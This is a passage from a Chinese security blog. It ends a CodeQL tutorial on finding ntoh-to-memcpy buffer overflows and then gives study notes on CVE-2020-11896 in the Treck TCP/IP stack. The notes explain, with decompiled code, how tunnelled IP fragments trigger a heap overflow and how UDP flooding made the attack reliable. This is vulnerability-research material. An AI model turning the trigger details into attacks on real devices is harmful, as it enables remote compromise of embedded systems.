class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br></pre></td></tr></table></figure><p>设置来源对象为 表达式，是 <code>NetworkByteSwap</code> 这个类的值，<code>NetworkByteSwap</code> 这个类在 0x06 定义</p><p>然后设置接收器，接收器为 <code>memcpy</code> 的size 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this &#x3D; &quot;Config: this name doesn&#39;t matter&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png"></a></p><p>其中有多个明显的缓冲区溢出漏洞</p><h2 id="使用CodeQL-进行-0day-挖掘"><a href="#使用CodeQL-进行-0day-挖掘" class="headerlink" title="使用CodeQL 进行 0day 挖掘"></a>使用CodeQL 进行 0day 挖掘</h2><p>我们通过  CodeQL 编写了一个 ntoh -&gt; memcpy 的数据流追踪，当我们通过检查相应的代码我们即可分析是否有缓冲区溢出风险。我们学习了差不多了，我们可以通过这个成型的查询来查询一些类似这样的安全问题。</p><p>例如我通过这个查询，挖掘了两个缓冲区溢出漏洞: CVE-2020-28194 和 CVE-2020-15173</p><p>大家也可以去尝试尝试。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="codeql" scheme="https://bestwing.me/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>关于 CVE-2020-11896和CVE-2020-11898 的学习笔记</title>
    <link href="https://bestwing.me/Ripple20-overview.html"/>
    <id>https://bestwing.me/Ripple20-overview.html</id>
    <published>2020-06-29T16:00:00.000Z</published>
    <updated>2020-07-02T13:42:21.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>学习了一下这 ripper 20的两个洞</p><h2 id="CVE-2020-11896"><a href="#CVE-2020-11896" class="headerlink" title="CVE-2020-11896"></a>CVE-2020-11896</h2><h3 id="IPv4-分片"><a href="#IPv4-分片" class="headerlink" title="IPv4 分片"></a>IPv4 分片</h3><p>IP分片使得即使在IP分组的大小大于网络的特定链路中允许的最大大小的情况下，也可以在网络中发送IP分组。IP分段是一种将分组分成几个较小部分(“片段”)以支持在这些链路和网络上传输的技术。该协议支持TH分组的分段然后重组。</p><p>使用IP报头中的标识字段将不同的片段分组。该标识字段描述片段属于哪个分组。这允许不同的数据包在网络中分段传输，并在另一端正确重组。最后一个片段的MF(更多片段)位标志设置为0，而所有其他片段的MF=1。</p><p>网络堆栈负责对大型数据包进行分段，并通过网络发送多个分段。请求发送大型数据报的UDP应用程序就是一个例子。网络堆栈还负责在接收到分段的数据包时对其进行重组。</p><p>如果只有部分数据包碎片到达，网络堆栈最终会丢弃这些碎片。在大多数实现中，当处理任何片段时，网络堆栈启动计时器。当该计时器到期时，网络堆栈丢弃属于同一标识组的所有片段。</p><p>IPv4通过Flags及Fragment Offset字段对分片进行管理，Flags由R、DF、MF三部分组成：</p><p>● R（Reserve bit）保留未用</p><p>● DF (Don’t Fragment) DF =1：禁止分片 , DF =0：允许分片</p><p>● MF (More Fragment) MF =1：非最后一片, MF =0：最后一片(或未分片)</p><p>Fragment Offset(13位)：一个IP分组分片封装原IP分组数据的相对偏移量, 片偏移字段以8字节为单位。IP包结构如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="IP-隧道"><a href="#IP-隧道" class="headerlink" title="IP 隧道"></a>IP 隧道</h3><p>IP隧道允许两个独立网络之间的虚拟点对点链路。它是通过将一个数据包(可以是IP数据包)封装在另一个数据包中来实现的，从而使内部数据包具有与外部数据包不同的源地址和目的地址。</p><p>外部数据包的源地址和目的地址是隧道端点，内部数据包中的地址用于隧道两端的网络路由。<br>隧道入口点是接收应该通过隧道转发的IP分组的节点。它将此数据包封装在外部IP数据包中。当数据包到达隧道出口点时，会将其解封并转发，就好像它是在目标网络中发送的常规数据包一样。<br>隧道使用的一个主要示例是虚拟专用网(VPN)技术。<br>有几种隧道协议，最简单、最古老的协议之一是IP-in-IP(IP协议号4)。</p><h4 id="IP-in-IP"><a href="#IP-in-IP" class="headerlink" title="IP-in-IP"></a>IP-in-IP</h4><p>IP-in-IP是一种IP隧道协议，在该协议中，通过添加具有分别等于隧道入口点和出口点的源地址和目的地址的外部IP报头，将一个IP数据包封装在另一个IP数据包中。<br>内部数据包未修改，外部IP报头从内部IP报头复制一些字段。外部标头的IP协议号为4。</p><h3 id="Treck-TCP-IP"><a href="#Treck-TCP-IP" class="headerlink" title="Treck TCP/IP"></a>Treck TCP/IP</h3><p>在 Treck TCP/IP 中，有个结构体用来描述其 TCP/IP栈，称为tsPacket。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsPacket</span> &#123;</span></span><br><span class="line">ttUserPacket pktUserStruct;</span><br><span class="line">ttSharedDataPtr pktSharedDataPtr; <span class="comment">// Point to corresponding sharable ttSharedData struct tsPacket * pktChainNextPtr; // Next packet (head of a new datagram in a queue) struct tsDeviceEntry * pktDeviceEntryPtr; // pointer to network Device struct</span></span><br><span class="line"><span class="keyword">union</span> anon_union_for_pktPtrUnion pktPtrUnion; tt32Bit pktTcpXmitTime;</span><br><span class="line">tt16Bit pktUserFlags; tt16Bit pktFlags; tt16Bit pktFlags2;</span><br><span class="line">tt16Bit pktMhomeIndex;</span><br><span class="line">tt8Bit pktTunnelCount; <span class="comment">// Number of times this packet has been decapsulated. Initially set</span></span><br><span class="line">tt8Bit pktIpHdrLen; <span class="comment">// Number of bytes occupied by the IP header.</span></span><br><span class="line">tt8Bit pktNetworkLayer; <span class="comment">// Specifies the network layer type of this packet (IPv4, IPv6,</span></span><br><span class="line">‹→ ARP, etc).</span><br><span class="line">tt8Bit pktFiller[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是包含的ttUserPacket 结构（tsUserPacket的typedef ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsUserPacket</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * pktuLinkNextPtr; <span class="comment">// Next tsUserPacket for fragmented data</span></span><br><span class="line">ttUser8BitPtr pktuLinkDataPtr; <span class="comment">// Pointer to data</span></span><br><span class="line">ttPktLen pktuLinkDataLength; <span class="comment">// Size of data pointed by pktuLinkDataPtr</span></span><br><span class="line">ttPktLen pktuChainDataLength; <span class="comment">// Total packet length (of chained fragmented data). Valid</span></span><br><span class="line">‹→ in first link only.</span><br><span class="line"><span class="keyword">int</span> pktuLinkExtraCount; <span class="comment">// Number of links linked to this one (not including this one).</span></span><br><span class="line">‹→ Valid in first link only.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pktuLinkDataPtr 指向当前片段的数据缓冲区。随着网络堆栈在不同阶段处理数据包并取决于当前正在处理的数据包层 ，此数据缓冲区内的确切位置会发生变化。 对于 例如，当网络栈处理所述以太网层（在tfEtherRecv ），该字段指向以太网报头。</p><p>pktuLinkDataLength字段指定pktuLinkDataPtr指向的数据的大小，即单个片段的大小。<br>pktuLinkNextPtr用于跟踪数据包中的片段。此字段指向表示下一个片段的另一个tsPacket，该片段又包含对下一个片段的引用，依此类推。因此，我们也可以在此链表中将片段称为“链接”。如果此链接是最后一个片段，或者如果数据未分段，则此字段将等于NULL。<br>pktuChainDataLength字段表示包括所有片段的分组长度，即分组的总大小。它只为第一个片段设置，如果数据没有分段，则等于pktuLinkDataLength。</p><p>堆栈中的一种常见模式是在堆栈中的各层之间移动时调整pktuLinkDataPtr指针。例如，如果我们的数据包是ICMP回应请求数据包(PING)，则它将由三层组成：以太网，然后是IPv4，最后是ICMP。在这种情况下，当以太网层被处理时(在函数tfEtherRecv中)，pktuLinkDataPtr指向以太网头的开始，然后在移动到下一层之前，使用以下代码对其进行调整：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkt-&gt;pktuLinkDataPtr = pkt-&gt;pktuLinkDataPtr + <span class="number">0xe</span>;</span><br><span class="line">pkt-&gt;pktuLinkDataLength = pkt-&gt;pktuLinkDataLength - <span class="number">0xe</span>; </span><br><span class="line">pkt-&gt;pktuChainDataLength = pkt-&gt;pktuChainDataLength - <span class="number">0xe</span>;</span><br></pre></td></tr></table></figure><p>在本例中，0xE(十进制14)是以太网头的大小(6(Dst MAC)+6(Src MAC)+2(EtherType))。<br>当tfEtherRecv完成数据包处理时，它会使用代表下一层协议的EtherType字段将数据包转发到下一层处理。遇到的支持的以太网类型有ARP、IPv4和IPv6。</p><a href="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" title="img" class="gallery-item"><img src="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" alt="img" style="zoom:50%;" /></a><p>在此的示例中，当IPv4层接收到数据包(在函数tfIpIncomingPacket中)时，指针pktuLinkDataPtr已经指向以太网头，因此可以安全地假设pktuLinkDataPtr指向的数据是IPv4头。<br>传入的数据由具有相同命名约定TF<em>IncomingPacket的函数处理(正如我们已经看到的)，其中</em>是协议名称。在以太网/IPv4/ICMP的情况下，包将由函数tfEtherRecv、tfIpIncomingPacket处理。<br>和tfIcmpIncomingPacket。<br>Treck堆栈处理从tfIpIncomingPacket调用的过程tfIpReAssemblePacket中的片段重组。每当接收到发往设备的IP片段时，都会调用此过程。如果缺少片段，则函数返回NULL。否则，如果所有片段都到达并且没有漏洞，则网络堆栈使用pktuLinkNextPtr字段将片段链接在一起，并传递数据包以供下一层进一步处理。在此上下文中的单词“重组”并不意味着将分组复制到连续的存储块，而是简单地将它们链接在一个链表中。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>为了了解漏洞的根本原因，我们将快速查看IP标头中的两个字段：</p><p><em>•</em> IHL （4个比特）：该尺寸的所述IP 报头中的双字。最低值是5 （20 个字节）。如果有IP选项，头长度变大，最多值的0xf（60个字节）。  </p><p><em>•</em> 总长度（2个字节）：整个IP数据包的大小，以字节（或IP片段，如果是分段的）为单位，包括报头。  </p><p>函数tfIpIncomingPacket 从一些基本的健全性检查开始。除了验证标头校验和之外，它还验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_version &#x3D;&#x3D; 4 &amp;&amp; data_available &gt;&#x3D; 21 &amp;&amp; header_length &gt;&#x3D; 20 &amp;&amp; total_length &gt; header_length &amp;&amp; total_length &lt;&#x3D; data_available</span><br></pre></td></tr></table></figure><p>“可用数据”是使用字段pktuChainDataLength测量的。<br>如果所有健全性检查都通过，该函数将检查IP报头中指定的总长度是否严格小于数据包的pktuChainDataLength，表明实际接收的数据多于IP报头中所述的数据。如果为真，则执行修剪操作以删除额外数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)ipTotalLength &lt;= pkt-&gt;pktuChainDataLength) &#123; <span class="keyword">if</span> ((uint)ipTotalLength != pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">pkt-&gt;pktuChainDataLength = (uint)ipTotalLength; </span><br><span class="line">pkt-&gt;pktuLinkDataLength = (uint)ipTotalLength;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是漏洞所在。回想一下，pktuLinkDataLength保存当前片段的大小，pktuChainDataLength保存整个数据包的大小。如果执行上述操作，则会创建不一致，其中pkt-&gt;pktuChainDataLength。<br>==pkt-&gt;pktuLinkDataLength，但可能有其他片段指向。<br>pkt-&gt;pktuLinkNextPtr.。另一种方式是将其视为一种虚构的不一致状态，其中链表上片段的总大小大于pktuChainDataLength中存储的大小。<br>由弱修剪操作产生的不一致对于处理的其余部分来说不是好兆头。然而，我们还有另一个挑战需要克服。每次使用一个接收到的片段调用tfIpIncomingPacket函数，并调用tfIpReAssemblePacket来处理它。tfIpReAssemblePacket负责将片段插入到上述链表中。它不会将片段复制到连续的内存缓冲区。收到所有片段后，tfIpReAssemblePacket以片段链接列表的形式返回完整的数据包，以便在下一个协议层进行进一步处理。该重组操作在易受攻击的修剪操作之后执行。一旦可靠的操作完成，tfIpIncomingPacket将返回或转发数据包，以便在下一网络层(例如：UDP)进行处理。这会阻止我们执行利用漏洞攻击，因为我们需要分段的数据包才能达到不一致的状态。换句话说，易受攻击的代码应该只在每个片段的基础上执行(或在单个片段的数据包上执行)。如果以这种方式执行，它实际上并不容易受到攻击。<br>那么，我们如何才能用传入的碎片数据触发易受攻击的修剪流，从而实现上述不一致呢？</p><h4 id="在IP层处理分段数据包"><a href="#在IP层处理分段数据包" class="headerlink" title="在IP层处理分段数据包"></a>在IP层处理分段数据包</h4><p>为了使分段的数据包在IP层得到处理并到达易受攻击的流，我们使用隧道。<br>隧道允许tfIpIncomingPacket将内部IP数据包作为非分段数据包进行处理。函数tfIpIncomingPacket将被递归调用两次，一次用于IP隧道的内层，多次用于外层(每个片段一次)。首先，tfIpIncomingPacket将接收来自外层的所有片段，在每个片段上调用tfIpReAssemblePacket，一旦它们都被接收，它将把执行传递到下一个协议层，在本例中再次是IPv4，因此将从具有内部IP层的tfIpIncomingPacket调用tfIpIncomingPacket。</p><p><a href="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" title="img" class="gallery-item"><img src="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" alt="img"></a></p><p>对外部IP分组进行分段会导致使用内部分组调用tfIpIncomingPacket，该内部分组现在由几个分段组成，但在IP报头中标记为未分段(MF=0)。就描述数据包的数据结构而言，它现在由链接列表中的几个单独的链接组成，每个链接都有一个单独的pktuLinkDataLength值。</p><p>让我们说得更具体些。请考虑下面的示例，它将伴随我们完成本文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" title="image-20200630192655708" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" alt="image-20200630192655708"></a></p><p>(我们将 checksum 字段设置为0，因为这将导致跳过UDP校验和验证。)。<br>当网络堆栈处理外部片段时，它使用字段将它们链接起来。<br>如前所述，tsUserPacket结构中的pktuLinkNextPtr。当函数tfIpIncomingPacket处理内部IP包(由于协议=4)时，它正在处理传入的分片数据(内部IP包由两个链接在一起的tsPacket结构表示)，但仍会调用易受攻击的流，从而解决了我们的挑战。<br>此外，内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。在我们的示例中，内部IP数据包(32)的总长度较小。<br>超过链数据长度(1000+8+20=1028)，因此Treck堆栈将通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值-总IP长度(在我们的示例中为32)，来尝试不正确地修剪数据包。这导致内部IP分组由链接在一起的两个tsPacket结构表示，但是它们的总CUSIZE大于pktuChainDataLength字段(pktuChainDataLength字段在修整后等于32，而不是1028字节)。</p><p><a href="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" title="img" class="gallery-item"><img src="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" alt="img"></a></p><h4 id="利用UDP实现堆溢出"><a href="#利用UDP实现堆溢出" class="headerlink" title="利用UDP实现堆溢出"></a>利用UDP实现堆溢出</h4><p>既然我们已经达到了不一致的状态，我们就面临着另一个问题–我们如何利用这种不一致来获得内存损坏原语？<br>原来，至少有一条代码路径将碎片数据复制到单个连续缓冲区中。这是处理UDP数据报的代码的一部分。该流的内部逻辑由正在分配的新分组(使用tfGetSharedBuffer)组成，其大小基于pktuChainDataLength字段，随后是分组的不同片段的副本逐个进入新分配的分组。<br>负责执行复制的函数是tfCopyPacket，它按顺序接受源包和目的包。以下是片段复制代码的摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(dst-&gt;pktuLinkDataPtr + i,src-&gt;pktuLinkDataPtr,src-&gt;pktuLinkDataLength); i = i + src-&gt;pktuLinkDataLength;</span><br><span class="line">src = (tsPacket *)src-&gt;pktuLinkNextPtr;</span><br><span class="line">&#125; <span class="keyword">while</span> (src != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>如您所见，函数tfCopyPacket没有考虑它写入的缓冲区的长度。它只是从src包(我们的分段包)中提取每个链接，并将其数据复制到目标包中。目标数据包是根据pktuChainDataLength分配的，因此如果之前触发了该漏洞，则在我们的无效之后，分配的缓冲区可能小于数据包中所有单个链接的总和-因此，会发生堆溢出。</p><p>还有一件事需要描述，那就是我们如何触发这一流程。</p><p>如果应用程序正在侦听任何UDP端口，则发往该端口的UDP数据包将被传递给套接字处理函数tfSocketIncomingPacket。其任务是将数据包附加到套接字接收队列(稍后由应用层轮询)。</p><p>在我们的研究中，我们发现当UDP数据包的套接字接收队列非空并且有新的数据包到达时，上述包含堆溢出的流是可以实现的。请看tfSocketIncomingPacket的以下摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ocal_10 = pkt;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">if</span> (sockEntry-&gt;socReceiveQueueNextPtr == <span class="literal">NULL</span>) &#123; sockEntry-&gt;socReceiveQueueNextPtr = pkt; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">queueLastPtr = sockEntry-&gt;socReceiveQueueLastPtr;</span><br><span class="line"><span class="keyword">if</span> ((queueLastPtr-&gt;pktSharedDataPtr-&gt;dataFlags &amp; <span class="number">0x40</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Shared data doesn&#x27;t point to user device memory */</span></span><br><span class="line">sizeOfPacketBuffer = (uint)(pkt-&gt;pktSharedDataPtr-&gt;dataBufLastPtr +</span><br><span class="line">‹→ -(<span class="keyword">int</span>)pkt-&gt;pktSharedDataPtr-&gt;dataBufFirstPtr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (protoNum == <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Related to TCP; redacted for brevity */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sizeOfPacketBuffer != <span class="number">0</span>) &#123;</span><br><span class="line">uVar2 = (uint)sockEntry-&gt;socRecvCopyFraction * pkt-&gt;pktuChainDataLength; <span class="keyword">if</span> (uVar2 &lt;= sizeOfPacketBuffer) &#123;</span><br><span class="line">dst = tfGetSharedBuffer(<span class="number">0x54</span>,pkt-&gt;pktuChainDataLength,<span class="number">0</span>); <span class="keyword">if</span> (dst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">tfCopyPacket(pkt,dst); needToDrop = <span class="literal">true</span>; local_10 = dst;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">queueLastPtr-&gt;pktChainNextPtr = local_10; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，为了到达tfGetSharedBuffer，我们需要绕过涉及到ocRecvCopyFraction的检查。我们不知道它的确切用途，但通过调试和实验，我们发现它的值是4(在我们的情况下)。</p><p>在我们反复出现的示例中，我们的第一个数据包链路的缓冲区大小很小，因此SizzeOfPacketBuffer。<br>相对较小(大约10s字节)。<br>但是当我们到达该流时，pkt-&gt;pktuChainDataLength等于4(修剪后为32，然后在处理IP层时递减20(IP报头的大小)，然后再次递减8(UDP报头的大小))。因此，4*4=16小于sizeOfPacketBuffer，我们通过此检查。<br>我们需要确保的最后一件事是UDP数据包的接收队列是非空的(否则无法到达此流)。在理论上，有几种方法可以做到这一点。在我们的攻击中，我们发现将多个UDP数据包足够快地发送到同一端口就可以做到这一点。然而，要让这一部分可靠地工作是很棘手的。该漏洞是用Python编写的，使用的Scapy对于我们的目的来说太慢了。为了克服这个障碍，我们使用了Scapy的L3Socket对象，并实例化了一堆线程，这些线程只会用良性的UDP数据包淹没设备，因此套接字接收队列将是非空的。用C或GO编写代码可能也可以。根据要利用的设备和侦听服务器，可以对此部分进行其他改进。<br>另一个障碍是，在我们到达发生溢出的tfSocketIncomingPacket之前，易受攻击的数据包通过tfUdpIncomingPacket。此函数包含一些与UDP相关的健全性检查，因此我们还需要通过这些检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">udpLen &#x3D; udpHdr-&gt;udpLength &gt;&gt; 8 | udpHdr-&gt;udpLength &lt;&lt; 8;</span><br><span class="line">if ((udpLen &lt; 8) || (*(ushort  *)&amp;pkt-&gt;pktuChainDataLength  &lt;  udpLen))  goto  dropPacket; if (udpLen &lt; *(ushort *)&amp;pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">tfPacketTailTrim(pkt,(uint)udpLen,0);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* ... *&#x2F;</span><br><span class="line">if ((udpHdr-&gt;udpChecksum !&#x3D; 0) &amp;&amp; (tvUdpIncomingChecksumOn !&#x3D; 0)) &#123;</span><br><span class="line">&#x2F;* Compute checksum... 